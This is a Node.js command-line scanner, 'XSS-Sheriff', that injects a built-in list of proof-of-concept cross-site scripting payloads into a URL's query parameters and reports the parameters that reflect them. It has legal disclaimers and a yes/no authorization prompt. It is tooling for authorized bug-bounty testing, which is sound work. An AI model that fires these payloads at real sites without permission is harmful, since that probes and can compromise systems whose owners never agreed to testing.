#!/usr/bin/env node

/**
 * XSS-Sheriff - Security Testing Tool
 * Created by DezTheJackal
 * For authorized penetration testing and bug bounty programs only
 */

const https = require('https');
const http = require('http');
const url = require('url');
const readline = require('readline');

// Color codes for terminal
const colors = {
  reset: '\x1b[0m',
  bright: '\x1b[1m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m',
  white: '\x1b[37m'
};

// XSS test payloads
const XSS_PAYLOADS = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '"><script>alert(1)</script>',
  "'><script>alert(1)</script>",
  '<iframe src="javascript:alert(1)">',
  '<body onload=alert(1)>',
  'javascript:alert(1)',
  '<input onfocus=alert(1) autofocus>',
  '<details open ontoggle=alert(1)>',
  '<marquee onstart=alert(1)>',
  '<select onfocus=alert(1) autofocus>'
];

class XSSSheriff {
  constructor() {
    this.vulnerabilities = [];
    this.rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
  }

  displayBanner() {
    console.clear();
    console.log(colors.cyan + colors.bright);
    console.log(`
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║                      🤠 XSS-SHERIFF 🤠                        ║
    ║                                                               ║
    ║                    _.---._    /\\\\                            ║
    ║                  ./'       "--\`\\//                           ║
    ║                ./              o \\                            ║
    ║               /./\\  )______   \\__ \\                          ║
    ║              ./  / /\\ \\   | \\ \\  \\ \\                         ║
    ║                 / /  \\ \\  | |\\ \\  \\7                         ║
    ║                  "     "    "  "                              ║
    ║                                                               ║
    ║                   *BANG!* 💥 Got that bug!                   ║
    ║                                                               ║
    ║───────────────────────────────────────────────────────────────║
    ║                                                               ║
    ║                  Created by DezTheJackal                      ║
    ║                                                               ║
    ║  A fast and simple XSS vulnerability scanner for authorized  ║
    ║  penetration testing and bug bounty hunting. Hunt down XSS   ║
    ║  vulnerabilities like a true security sheriff! 🎯             ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    ` + colors.reset);
  }

  async displayMenu() {
    console.log(colors.yellow + '\n  🌟 Main Menu' + colors.reset);
    console.log('  ═══════════════════════════════════════════════════════\n');
    console.log(colors.green + '  [1]' + colors.reset + ' 🔍 XSS Scanner - Test for Cross-Site Scripting');
    console.log(colors.green + '  [2]' + colors.reset + ' 📚 View Payload Library');
    console.log(colors.green + '  [3]' + colors.reset + ' ℹ️  About XSS-Sheriff');
    console.log(colors.green + '  [4]' + colors.reset + ' 🚪 Exit\n');
    console.log('  ═══════════════════════════════════════════════════════\n');

    return this.prompt(colors.cyan + '  Sheriff, what\'s your choice? ' + colors.reset);
  }

  async showAbout() {
    console.log(colors.magenta + '\n  📖 About XSS-Sheriff' + colors.reset);
    console.log('  ═══════════════════════════════════════════════════════\n');
    console.log('  Version: 1.0.0');
    console.log('  Creator: DezTheJackal');
    console.log('  License: MIT\n');
    console.log('  XSS-Sheriff is a penetration testing tool designed to');
    console.log('  help security researchers find XSS vulnerabilities in');
    console.log('  web applications during authorized bug bounty hunts.\n');
    console.log(colors.red + '  ⚠️  LEGAL NOTICE:' + colors.reset);
    console.log('  Only use on systems you own or have written permission');
    console.log('  to test. Unauthorized testing is illegal!\n');
    
    await this.prompt('  Press Enter to continue...');
  }

  async showPayloadLibrary() {
    console.log(colors.magenta + '\n  📚 XSS Payload Library' + colors.reset);
    console.log('  ═══════════════════════════════════════════════════════\n');
    
    XSS_PAYLOADS.forEach((payload, index) => {
      console.log(colors.green + `  [${index + 1}]` + colors.reset + ` ${payload}`);
    });
    
    console.log('\n  Total Payloads: ' + XSS_PAYLOADS.length + '\n');
    await this.prompt('  Press Enter to continue...');
  }

  async showLegalDisclaimer() {
    console.log(colors.red + colors.bright + '\n  ⚖️  LEGAL DISCLAIMER' + colors.reset);
    console.log('  ═══════════════════════════════════════════════════════\n');
    console.log('  This tool is for AUTHORIZED security testing ONLY.');
    console.log('  \n  • Only test systems you own or have written permission');
    console.log('  • Unauthorized access is illegal (CFAA, Computer Misuse Act)');
    console.log('  • Always follow responsible disclosure guidelines');
    console.log('  • Respect bug bounty program scope and rules\n');
    console.log('  By using this tool, you accept full responsibility for');
    console.log('  your actions and agree to use it legally and ethically.\n');
    console.log('  ═══════════════════════════════════════════════════════\n');

    const answer = await this.prompt(colors.yellow + '  Do you have authorization to test your target? (yes/no): ' + colors.reset);
    return answer.toLowerCase() === 'yes';
  }

  async runXSSScanner() {
    console.log(colors.cyan + '\n  🔍 XSS Scanner' + colors.reset);
    console.log('  ═══════════════════════════════════════════════════════\n');

    const authorized = await this.showLegalDisclaimer();
    
    if (!authorized) {
      console.log(colors.red + '\n  ❌ Authorization not confirmed. Returning to menu.\n' + colors.reset);
      await this.prompt('  Press Enter to continue...');
      return;
    }

    const targetUrl = await this.prompt(colors.cyan + '\n  Enter target URL (e.g., https://example.com/search?q=test): ' + colors.reset);
    
    if (!targetUrl || (!targetUrl.startsWith('http://') && !targetUrl.startsWith('https://'))) {
      console.log(colors.red + '\n  ❌ Invalid URL format. Please include http:// or https://\n' + colors.reset);
      await this.prompt('  Press Enter to continue...');
      return;
    }

    console.log(colors.yellow + '\n  🔫 Loading bullets into the chamber...\n' + colors.reset);
    await this.performXSSTest(targetUrl);
    
    await this.prompt(colors.cyan + '\n  Press Enter to return to menu...' + colors.reset);
  }

  async performXSSTest(targetUrl) {
    console.log(colors.bright + '  🎯 Target acquired: ' + colors.reset + targetUrl);
    console.log('  ═══════════════════════════════════════════════════════\n');

    const params = this.extractParameters(targetUrl);
    
    if (params.length === 0) {
      console.log(colors.yellow + '  ⚠️  No URL parameters found to test' + colors.reset);
      console.log('  💡 Tip: Add parameters like ?search=test&id=123\n');
      return;
    }

    console.log(colors.green + `  Found ${params.length} parameter(s): ${params.join(', ')}\n` + colors.reset);
    this.vulnerabilities = [];
    let testCount = 0;

    for (const param of params) {
      console.log(colors.cyan + `  Testing parameter: ${param}` + colors.reset);
      
      for (const payload of XSS_PAYLOADS) {
        testCount++;
        process.stdout.write(`  Progress: ${testCount}/${params.length * XSS_PAYLOADS.length} tests\r`);
        
        const parsedUrl = url.parse(targetUrl, true);
        parsedUrl.query[param] = payload;
        delete parsedUrl.search;
        const testUrl = url.format(parsedUrl);

        const result = await this.testURL(testUrl, payload, param);
        
        if (result.vulnerable) {
          this.vulnerabilities.push(result);
          console.log(colors.green + `\n  ✓ Potential vulnerability found!` + colors.reset);
        }
      }
      console.log('\n');
    }

    this.displayResults(testCount);
  }

  async testURL(testUrl, payload, param) {
    return new Promise((resolve) => {
      const parsedUrl = url.parse(testUrl);
      const protocol = parsedUrl.protocol === 'https:' ? https : http;
      
      const options = {
        method: 'GET',
        headers: {
          'User-Agent': 'XSS-Sheriff/1.0 (Security Testing)',
        },
        timeout: 5000
      };

      const req = protocol.request(testUrl, options, (res) => {
        let data = '';
        
        res.on('data', (chunk) => {
          data += chunk;
        });
        
        res.on('end', () => {
          if (data.includes(payload)) {
            resolve({
              vulnerable: true,
              param: param,
              payload: payload,
              url: testUrl
            });
          } else {
            resolve({ vulnerable: false });
          }
        });
      });

      req.on('error', () => {
        resolve({ vulnerable: false, error: true });
      });

      req.on('timeout', () => {
        req.destroy();
        resolve({ vulnerable: false, timeout: true });
      });

      req.end();
    });
  }

  extractParameters(targetUrl) {
    const parsedUrl = url.parse(targetUrl, true);
    return Object.keys(parsedUrl.query);
  }

  displayResults(testCount) {
    console.log(colors.bright + '\n  ═══════════════════════════════════════════════════════');
    console.log('  📊 SCAN RESULTS');
    console.log('  ═══════════════════════════════════════════════════════' + colors.reset);
    console.log(`\n  Total tests fired: ${colors.yellow}${testCount}${colors.reset}`);
    console.log(`  Vulnerabilities found: ${this.vulnerabilities.length > 0 ? colors.red : colors.green}${this.vulnerabilities.length}${colors.reset}\n`);

    if (this.vulnerabilities.length > 0) {
      console.log(colors.red + colors.bright + '  🚨 VULNERABILITIES DETECTED! 🚨\n' + colors.reset);
      
      this.vulnerabilities.forEach((vuln, index) => {
        console.log(colors.yellow + `  [${index + 1}] Vulnerability Found:` + colors.reset);
        console.log(`      Parameter: ${colors.cyan}${vuln.param}${colors.reset}`);
        console.log(`      Payload: ${colors.red}${vuln.payload}${colors.reset}`);
        console.log(`      URL: ${vuln.url.substring(0, 80)}...\n`);
      });
      
      console.log(colors.green + '  📝 Next Steps:' + colors.reset);
      console.log('  1. ✓ Verify findings manually in a browser');
      console.log('  2. ✓ Document with screenshots and PoC');
      console.log('  3. ✓ Submit to bug bounty program');
      console.log('  4. ✓ Follow responsible disclosure\n');
    } else {
      console.log(colors.green + '  ✅ No obvious XSS vulnerabilities detected' + colors.reset);
      console.log('  💡 Consider manual testing for complex scenarios\n');
    }
  }

  prompt(question) {
    return new Promise((resolve) => {
      this.rl.question(question, (answer) => {
        resolve(answer);
      });
    });
  }

  async run() {
    this.displayBanner();
    
    let running = true;
    while (running) {
      const choice = await this.displayMenu();
      
      switch (choice) {
        case '1':
          await this.runXSSScanner();
          break;
        case '2':
          await this.showPayloadLibrary();
          break;
        case '3':
          await this.showAbout();
          break;
        case '4':
          console.log(colors.yellow + '\n  🤠 Happy hunting, Sheriff! Stay legal!\n' + colors.reset);
          running = false;
          this.rl.close();
          break;
        default:
          console.log(colors.red + '\n  ❌ Invalid choice. Please select 1-4.\n' + colors.reset);
          await this.prompt('  Press Enter to continue...');
      }
    }
  }
}

// Main execution
const sheriff = new XSSSheriff();
sheriff.run();
